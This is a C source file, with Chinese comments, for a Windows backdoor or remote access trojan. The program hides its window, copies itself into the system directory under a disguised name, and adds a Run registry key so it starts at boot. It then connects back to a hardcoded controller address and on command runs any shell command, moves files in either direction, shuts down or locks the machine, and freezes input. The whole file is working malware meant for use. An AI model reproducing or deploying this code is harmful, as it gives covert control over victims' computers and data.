#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <winable.h>
#pragma comment(lib, "ws2_32.lib")
https://blog.csdn.net/Rock_y/article/details/107090790
https://blog.csdn.net/Rock_y/article/details/107293102
#ifdef _MSC_VER  
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )  
#endif

#define MSG_LEN 1024
#define MSG_LENN 5120


int ServerPort = 8083;  //连接的端口
char ServerAddr[] = "192.168.88.133"; //反弹连接的域名
int CaptureImage(HWND hWnd, CHAR *dirPath, CHAR *filename);


// 发送文件
int sendFile(SOCKET client, char *filename) 
{		
    char sendbuf[1024];
    DWORD        dwRead;  
    BOOL         bRet;
	Sleep(200);

    HANDLE hFile=CreateFile(filename,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	if(hFile==INVALID_HANDLE_VALUE) {
		return 1;
	}
    while(1) {  //发送文件的buf
        bRet=ReadFile(hFile,sendbuf,1024,&dwRead,NULL);
        if(bRet==FALSE) break;
        else if(dwRead==0) {
			Sleep(100);
            break;  
        } else {  
            send(client,sendbuf,dwRead,0);
        }  
    }
	send(client,"EOFYY",strlen("EOFYY")+1,0);
    CloseHandle(hFile);
	if (strcmp(filename,"screen.jpg")==0) {
		system("del screen.jpg");
	}
	
	return 0;
}

// 接受文件
int recvFile(SOCKET client, char *filename) 
{
	int len;
    char recvBuf[1024] = {0};   // 缓冲区
    HANDLE hFile;               // 文件句柄
    DWORD count;                // 写入的数据计数
 
    hFile = CreateFile(filename, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_ARCHIVE, NULL);
	if(hFile==INVALID_HANDLE_VALUE) {
		return 1;
	}
	send(client,"BEGIN",6,0);
    while (1) {
        // 从客户端读数据
		ZeroMemory(recvBuf, sizeof(recvBuf));   
		len = recv(client, recvBuf, 1024, 0);
        if (strlen(recvBuf) < 5) {
            if (strcmp(recvBuf, "EOF") == 0) {
                CloseHandle(hFile);
                break;
            }
		}
        WriteFile(hFile,recvBuf,len,&count,0);
    }
	Sleep(500);
	send(client,"RECV",5,0);
	return 0;
}

// 执行CMD命令，管道传输
int cmd(char *cmdStr, char *message)
{
    DWORD readByte = 0;
    char command[1024] = {0};
    char buf[MSG_LENN] = {0}; //缓冲区
 
    HANDLE hRead, hWrite;
    STARTUPINFO si;         // 启动配置信息
    PROCESS_INFORMATION pi; // 进程信息
    SECURITY_ATTRIBUTES sa; // 管道安全属性
 
    // 配置管道安全属性
    sa.nLength = sizeof( sa );
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
 
    // 创建匿名管道，管道句柄是可被继承的
	if( !CreatePipe(&hRead, &hWrite, &sa, MSG_LENN)) {
        return 1;
    }
 
    // 配置 cmd 启动信息
    ZeroMemory( &si, sizeof( si ) );
    si.cb = sizeof( si ); // 获取兼容大小
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; // 标准输出等使用额外的
    si.wShowWindow = SW_HIDE;               // 隐藏窗口启动
    si.hStdOutput = si.hStdError = hWrite;  // 输出流和错误流指向管道写的一头

	// 拼接 cmd 命令
	sprintf(command, "cmd.exe /c %s", cmdStr);
 
    // 创建子进程,运行命令,子进程是可继承的
    if ( !CreateProcess( NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi )) {
        CloseHandle( hRead );
        CloseHandle( hWrite );
		printf("error!");
        return 1;
    }
    CloseHandle( hWrite );
  
    //读取管道的read端,获得cmd输出
    while (ReadFile( hRead, buf, MSG_LENN, &readByte, NULL )) {
        strcat(message, buf);
        ZeroMemory( buf, MSG_LENN );
    }
    CloseHandle( hRead );

    return 0;
}


void c_socket() 
{

	// 初始化 Winsock
	WSADATA wsaData;
	struct hostent *host;
	struct in_addr addr;

	int iResult = WSAStartup( MAKEWORD(2,2), &wsaData );
	if ( iResult != NO_ERROR ) {
			//printf("Error at WSAStartup()\n");
	}
	while(1){

		//解析主机地址
		host = gethostbyname(ServerAddr);
		if( host == NULL ) {
			Sleep(20000);
			continue;
		}else{
			addr.s_addr = *(unsigned long * )host->h_addr;
			break;
		}
	}

	// 建立socket socket.
	SOCKET client;
	client = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
	if ( client == INVALID_SOCKET ) {
		printf( "Error at socket(): %ld\n", WSAGetLastError() );
		WSACleanup();
		return;
	}

	//获取主机名、用户名
	char userName[20]={0};
	char comName[20]={0};
	char comInfo[40]={0};
	DWORD nameLen = 20;
	DWORD comLen = 20;
	GetUserName(userName,&nameLen);
	GetComputerName(comName,&comLen);
	sprintf(comInfo, "%s#%s", comName, userName);

	// 连接到服务器.
	sockaddr_in clientService;
	clientService.sin_family = AF_INET;
	//clientService.sin_addr.s_addr = inet_addr("10.0.0.4");
	clientService.sin_addr.s_addr = inet_addr(inet_ntoa(addr));
	clientService.sin_port = htons(ServerPort);
	while(1){
		if ( connect( client, (SOCKADDR*) &clientService, sizeof(clientService) ) == SOCKET_ERROR) {
			//printf( "\nFailed to connect.\nWait 10s...\n" );
			Sleep(20000);
			continue;
		}else {
			send(client,comInfo, 40, 0);
			break;
		}
	}

	//阻塞等待服务端指令
	char recvCmd[MSG_LEN] = {0};
	char message[MSG_LENN+10] = {0};
	while(1) {
		ZeroMemory(recvCmd, sizeof(recvCmd));
		ZeroMemory(message,sizeof(message));

		//从服务端获取数据
        recv(client, recvCmd, MSG_LEN, 0);
		if(strlen(recvCmd)<1){  //SOCKET中断重连
			closesocket(client);
			while(1){
				client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
				if ( connect( client, (SOCKADDR*) &clientService, sizeof(clientService) ) == SOCKET_ERROR) {
					//printf( "\nFailed to connect.\nWait 10s...\n" );
					Sleep(20000);
					continue;
				}else {
					send(client,comInfo, 40, 0);
					break;
				}
			}
			continue;
		}else if(strcmp(recvCmd,"shutdown")==0){  //关机
			system("shutdown -s -t 1");
			continue;
		}else if(strcmp(recvCmd,"reboot")==0){  //重启
			system("shutdown -r -t 10");
			continue;
		}else if(strcmp(recvCmd,"cancel")==0){  //取消关机
			system("shutdown -a");
			continue;
		}else if(strcmp(recvCmd,"kill-client")==0){  //关闭客户端
			send(client,"Client has exit!", 18, 0);
			exit(0);
		}else if((recvCmd[0]=='$') || (recvCmd[0]=='@')){
			int i;
			char c;
			char CMD[30]={0};
			for(i = 1;(c = recvCmd[i])!= '\0';i ++) {
				CMD[i-1] = recvCmd[i];
			}
			if(recvCmd[0] == '$') {  //执行任意指令
				if(! cmd(CMD,message)) send(client, message, strlen(message)+1, 0);
				else send(client,"CMD Error!\n",13,0);
			}else {  //弹窗
				MessageBox(NULL,CMD,"Windows Message",MB_OK|MB_ICONWARNING);
			}
			continue;
		}else if(strcmp(recvCmd,"lock")==0){ //锁屏
			system("%windir%\\system32\\rundll32.exe user32.dll,LockWorkStation");
			continue;
		}else if(strcmp(recvCmd,"blockinput")==0){ //冻结鼠标和键盘
			BlockInput(true);
			Sleep(5000);
			BlockInput(false);
			continue;
		}else if(strcmp(recvCmd,"mouse")==0){ //重置光标
			SetCursorPos(0,0);
			continue;
		}else if(strcmp(recvCmd,"download")==0){ //上传文件
			ZeroMemory(recvCmd, sizeof(recvCmd));
			recv(client, recvCmd, MSG_LEN, 0);
			if(sendFile(client,recvCmd)) {
				send(client,"EOFNN",strlen("EOFNN")+1,0);
			}
			continue;
		}else if(strcmp(recvCmd,"upload")==0){ //下载文件
			ZeroMemory(recvCmd, sizeof(recvCmd));
			recv(client, recvCmd, MSG_LEN, 0);
			if(recvFile(client,recvCmd)){
				send(client,"ERRO", 5, 0);
			}
			continue;
		}else{
			continue;
		}
	}
	WSACleanup();
    return;
}

//自身复制
int copySelf(char *path)
{
	char fileName[MAX_PATH];
	char sysPath[MAX_PATH];
	GetModuleFileName(NULL,fileName, sizeof(fileName));
	GetSystemDirectory(sysPath, sizeof(sysPath));
	sprintf(path,"%s\\Sysconfig.exe",sysPath);
	CopyFile(fileName, path, TRUE);

	return 0;
}

int autoRun(char *path)
{
    HKEY hKey;
    DWORD result;
 
    //打开注册表
    result = RegOpenKeyEx(
        HKEY_LOCAL_MACHINE,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", // 要打开的注册表项名称
        0,              // 保留参数必须填 0
        KEY_SET_VALUE,  // 打开权限，写入
        &hKey           // 打开之后的句柄
    );

    if (result != ERROR_SUCCESS) return 0;

    // 在注册表中设置(没有则会新增一个值)
    result = RegSetValueEx(
                 hKey,
                 "SystemConfig", // 键名
                 0,                  // 保留参数必须填 0
                 REG_SZ,             // 键值类型为字符串
                 (const unsigned char *)path, // 字符串首地址
                 strlen(path)        // 字符串长度
             );

    if (result != ERROR_SUCCESS) return 0;
 
    //关闭注册表:
    RegCloseKey(hKey);

    return 0;
}

int main()
{
	char path[MAX_PATH];

	copySelf(path);
	autoRun(path);
	c_socket();

	return 0;
}
